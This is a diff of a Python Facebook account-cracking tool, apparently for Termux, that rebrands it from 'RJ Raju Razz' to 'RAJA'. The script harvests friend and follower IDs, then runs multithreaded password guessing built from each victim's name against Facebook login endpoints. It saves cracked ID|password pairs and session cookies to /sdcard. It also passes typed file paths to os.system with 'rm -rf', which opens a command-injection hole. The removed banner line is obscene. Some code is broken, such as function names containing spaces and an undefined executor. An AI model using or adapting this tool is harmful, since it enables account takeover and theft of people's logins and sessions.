@@ -25,7 +25,7 @@ from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as tred
 import base64
 import os,sys,time,json,random,re,string,platform,base64
-os.system("xdg-open https://www.facebook.com/profile.php?id=100046446651828/")
+os.system("xdg-open https://facebook.com/groups/1281986248984572/")
 try:
 	import requests
 	from concurrent.futures import ThreadPoolExecutor as ThreadPool
@@ -35,7 +35,7 @@ except ModuleNotFoundError:
 	os.system('pip install mechanize requests futures==2 > /dev/null')
 	os.system('python emmy.py')
 
-sys.stdout.write('\x1b]2; RJ Raju Razz\x07')
+sys.stdout.write('\x1b]2; RAJA\x07')
 S = '\033[1;37m'
 A = '\x1b[38;5;208m'
 R = '\x1b[38;5;46m'
@@ -44,23 +44,20 @@ Z = '\033[1;33m'
 head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
 logo = """
 \033[1;37m
-   
-██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
-██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
-███████║███████║██║     █████╔╝ █████╗  ██║  ██║
-██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║
-██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝
-╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ 
-                                                
-
+   d8888b.  .d8b.     d88b  .d8b. 
+   88  `8D d8' `8b    `8P' d8' `8b 
+   88oobY' 88ooo88     88  88ooo88 
+ \033[1;36m  88`8b   88~~~88     88  88~~~88  
+ \033[1;31m  88 `88. 88   88 db. 88  88   88 
+\033[1;37m   88   YD YP   YP Y8888P  YP   YP   \033[1;32mx ᴅ     
 \033[1;37m--------------------------------------------------
-[•] AUTHOR     : \033[1;32mRJ Raju Razz \033[1;37m
-[•] GITHUB     : \033[1;32mRJRajuRazz\033[1;37m 
-[•] TOOL TYPE  : \033[1;32mFILE CLONING\033[1;37m
+[•] AUTHOR     : \033[1;32mM SALMAN \033[1;37m
+[•] GITHUB     : \033[1;32mNo_gitHub\033[1;37m 
+[•] TOOL TYPE  : \033[1;32mPRO\033[1;37m
 [•] STATUS     : \033[1;32mPREMIUM\033[1;37m
 --------------------------------------------------
 [•] \033[1;37mVERSION    :\033[1;32m 3.1\033[1;37m
-[•]\033[1;31m TERA\033[1;36m  BAAP \033[1;34mHOOON \033[1;37mMADARCHOD
+[•]\033[1;31m NAAM\033[1;36m  HOGA \033[1;34mTO BADNAM TO \033[1;37mHONGE NA
 [•] \033[1;35mWill Update Every 2 Days  
 \033[1;37m-------------------------------------------------- """
 def clear():
@@ -75,10 +72,10 @@ def result(OKs,cps):
         print(' TOTAL OK: %s' % str(len(oks)))
         print(' TOTAL CP: %s' % str(len(cps)))
         print(47*'-')
-        input("Press enter to back RJ Raju Razz Menu ")
+        input("Press enter to back RAJA Menu ")
         exit()
 
-def RJ Raju Razz():   
+def RAJA():   
     os.system('clear')
     print(logo)
     print(f'[1] File Crack')
@@ -113,14 +110,14 @@ def RJ Raju Razz():
     elif select =='9':
        cutter()
     elif select =='C':
-        os.system("xdg-open https://www.facebook.com/profile.php?id=100046446651828")
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100013747051092")
         pass
     elif select =='F':
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100046446651828/')
+        os.system('xdg-open https://facebook.com/groups/1281986248984572/')
     else:
         print('\n Select valid option ... ')
         time.sleep(2)
-        RJ Raju Razz(allkey)
+        RAJA(allkey)
         
 def method_crack():
     global methods
@@ -145,7 +142,7 @@ def method_crack():
     #    methods.append('methodD')
    #     main_crack().crack(id)
     elif option =='0':
-        RJ Raju Razz()
+        RAJA()
     else:
       print('\n Select Valid Option ...')
       time.sleep(2)
@@ -173,7 +170,7 @@ class main_crack():
     def methodA(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r {S}[RJ Raju Razz] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r {S}[RAJA] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -224,15 +221,15 @@ class main_crack():
     'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RJ Raju Razzb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RJ Raju Razzb};{ckkk}"
-                    print(f"\r{R} [RAJU-OK] {sid} | {ps} {S}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RAJAb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RAJAb};{ckkk}"
+                    print(f"\r{R} [RAJA-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/RAJU_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RAJU_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/RAJA_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RAJA_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     #print(f"\r{A} [RAJU-CP] {sid} | {ps} {S}")
+                     #print(f"\r{A} [RAJA-CP] {sid} | {ps} {S}")
                      cps.append(sid)
-                     open('/sdcard/RAJU_CP.txt','a').write(sid+'|'+ps+'\n')
+                     open('/sdcard/RAJA_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -242,7 +239,7 @@ class main_crack():
     def methodC(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r {S}[RAJU] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r {S}[RAJA] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -293,15 +290,15 @@ class main_crack():
     'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RJ Raju Razzb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RJ Raju Razzb};{ckkk}"
-                    print(f"\r{R} [RJ Raju Razz-OK] {sid} | {ps} {S}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RAJAb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RAJAb};{ckkk}"
+                    print(f"\r{R} [RAJA-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/RJ Raju Razz_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RJ Raju Razz_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/RAJA_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RAJA_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #  print(f"\r{A} [RJ Raju Razz-CP] {sid} | {ps} {S}")
+                    #  print(f"\r{A} [RAJA-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/RJ Raju Razz_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/RAJA_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -311,7 +308,7 @@ class main_crack():
     def methodB(self, sid, name, psw):
         try:
             global oks,cps,loop
-            sys.stdout.write(f"\r {S}[RJ Raju Razz] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.write(f"\r {S}[RAJA] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
             sys.stdout.flush()
             fs = name.split(' ')[0]
             try:
@@ -362,15 +359,15 @@ class main_crack():
     'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RJ Raju Razzb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RJ Raju Razzb};{ckkk}"
-                    print(f"\r{R} [RJ Raju Razz-OK] {sid} | {ps} {S}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RAJAb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RAJAb};{ckkk}"
+                    print(f"\r{R} [RAJA-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/RJ Raju Razz_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RJ Raju Razz_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/RAJA_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RAJA_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #  print(f"\r{A} [RJ Raju Razz-CP] {sid} | {ps} {S}")
+                    #  print(f"\r{A} [RAJA-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/RJ Raju Razz_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/RAJA_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -379,7 +376,7 @@ class main_crack():
 
     def methodD(self, sid, name, psw):
         global oks,cps,loop
-        sys.stdout.write(f"\r {S}[RJ Raju Razz] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+        sys.stdout.write(f"\r {S}[RAJA] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
         sys.stdout.flush()
         fs = name.split(' ')[0]
         try:
@@ -397,14 +394,14 @@ class main_crack():
                 session.headers.update({'Host': 'x.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': sua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'})
                 complete = session.post('https://web.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                 if 'c_user' in session.cookies.get_dict():
-                    print(f"\r{R} [RJ Raju Razz-OK] {sid} | {ps} {S}")
+                    print(f"\r{R} [RAJA-OK] {sid} | {ps} {S}")
                     oks.append(sid)
-                    open('/sdcard/RJ Raju Razz_OK.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/RAJA_OK.txt','a').write(sid+'|'+ps+'\n')
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
-                    #print(f"\r{A} [RJ Raju Razz-CP] {sid} | {ps} {S}")
+                    #print(f"\r{A} [RAJA-CP] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/RJ Raju Razz_CP.txt','a').write(sid+'|'+ps+'\n')
+                    open('/sdcard/RAJA_CP.txt','a').write(sid+'|'+ps+'\n')
                     break
                 else:
                     continue
@@ -438,7 +435,7 @@ class main_crack():
             print(f'{S} Total IDs : %s ' % len(self.id))
             print(f'{S} Cracking Started...')
             print(47*"-")
-            with RJ Raju RazzRJ Raju Razz(max_workers=30) as RJ Raju Razzworld:
+            with RAJARAJA(max_workers=30) as RAJAworld:
                 for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
@@ -448,13 +445,13 @@ class main_crack():
                        else:
                             pwx =  pw
                             if 'methodA' in methods:
-                                RJ Raju Razzworld.submit(self.methodA, uid, name, pwx)
+                                RAJAworld.submit(self.methodA, uid, name, pwx)
                             elif 'methodB' in methods:
-                                RJ Raju Razzworld.submit(self.methodB, uid, name, pwx)
+                                RAJAworld.submit(self.methodB, uid, name, pwx)
                             elif 'methodC' in methods:
-                                RJ Raju Razzworld.submit(self.methodC, uid, name, pwx)
+                                RAJAworld.submit(self.methodC, uid, name, pwx)
                             elif 'methodD' in methods:
-                                RJ Raju Razzworld.submit(self.methodD, uid, name, pwx)
+                                RAJAworld.submit(self.methodD, uid, name, pwx)
                    except:pass
             result(oks,cps)   
             
@@ -516,7 +513,7 @@ def public():
             except KeyError:
                 print(f"\n{S}ID Not Found ...");pass
                 menu()
-        print(f'File Name To Dump Ids. Example /sdcard/RJ Raju Razz.txt') 
+        print(f'File Name To Dump Ids. Example /sdcard/RAJA.txt') 
         print(47*"-")
         filepath = input("Put File Name: ")
         os.system('rm -rf %s'%(filepath))
@@ -569,7 +566,7 @@ def follower():
         except KeyError:
             print(f"{A}ID Not Public");time.sleep(1)
             menu()
-        print(f'File Name To Dump Ids. Example /sdcard/RJ Raju Razz.txt') 
+        print(f'File Name To Dump Ids. Example /sdcard/RAJA.txt') 
         print(47*"-")
         filepath = input("Put File Name: ")
         os.system('rm -rf %s'%(filepath))
@@ -611,7 +608,7 @@ def sids():
     print('\033[1;37mPut limit between 1 to 10 \033[0;97m')
     limit = int(input('How many links do you want to separate?: '))
     clear()
-    print('\033[1;37mExample: /sdcard/RJ Raju Razz.txt\033[0;97m')
+    print('\033[1;37mExample: /sdcard/RAJA.txt\033[0;97m')
     print(47*'-')
     new_save = input('Save new file as: ')
     clear()
@@ -634,18 +631,18 @@ def cutter():
     os.system('clear')
     print(logo)
     print("Enter File Path / File Location \n")
-    RJ Raju Razz = input('Put File Name :')
+    RAJA = input('Put File Name :')
     print(" ")
-    RJ Raju Razz = input('Saving Put File Name :')
-    os.system('touch ' +RJ Raju Razz)
-    os.system('sort -r '+RJ Raju Razz+' | uniq > '+RJ Raju Razz)
+    RAJA = input('Saving Put File Name :')
+    os.system('touch ' +RAJA)
+    os.system('sort -r '+RAJA+' | uniq > '+RAJA)
     os.system('clear')
     print(logo)
-    print("Removed Successful From File : " + RJ Raju Razz )
+    print("Removed Successful From File : " + RAJA )
     print(47*'-')
-    print("File Saved To :" + RJ Raju Razz )
+    print("File Saved To :" + RAJA )
     print(47*'-')
-    input(f"{S} Press Enter To Back RJ Raju Razz Menu ")
+    input(f"{S} Press Enter To Back RAJA Menu ")
     menu
        
 
@@ -784,7 +781,7 @@ def p_dump():
         
         srange = int(input('How many IDs do you want to add?: ' ))
         clear()
-        print(f'{S}File Name To Dump Ids. Example /sdcard/RJ Raju Razz.txt\n') 
+        print(f'{S}File Name To Dump Ids. Example /sdcard/RAJA.txt\n') 
         filepath = input("Put File Name: ")
         apnd = open(filepath , 'a')
         clear()
@@ -807,30 +804,30 @@ def p_dump():
         print(f"Total IDs: {totaldmp} ")
         print(f"File Saved To  {filepath} ")
         print(47*'-')
-        input("Press enter to back RJ Raju Razz Menu ")
-        RJ Raju Razz(allkey)
+        input("Press enter to back RAJA Menu ")
+        RAJA(allkey)
     except Exception as e:
         print("Error : %s"%e) 
         
 def cutter():
     clear()
     print("Enter File Path / File Location \n")
-    RJ Raju Razz = input('Put File Name:')
+    RAJA = input('Put File Name:')
     print(" ")
-    RJ Raju Razz = input('Saving Put File Name:')
-    os.system('touch ' +RJ Raju Razz)
-    os.system('sort -r '+RJ Raju Razz+' | uniq > '+RJ Raju Razz)
+    RAJA = input('Saving Put File Name:')
+    os.system('touch ' +RAJA)
+    os.system('sort -r '+RAJA+' | uniq > '+RAJA)
     os.system('clear')
     print(logo)
-    print("Removed Successful From File: " + RJ Raju Razz )
-    print("New File Saved:" + RJ Raju Razz )
+    print("Removed Successful From File: " + RAJA )
+    print("New File Saved:" + RAJA )
     print(47*'-')
-    input(f"{S} Press Enter To Back RJ Raju Razz Menu ")
-    RJ Raju Razz(allkey)       
+    input(f"{S} Press Enter To Back RAJA Menu ")
+    RAJA(allkey)       
     
 def removef():
         os.system('rm -rf self.file');print(f'\n{R}Files Removed Successfully ...')
-        RJ Raju Razz(allkey)            
+        RAJA(allkey)            
  
 
-RJ Raju Razz()
+RAJA()
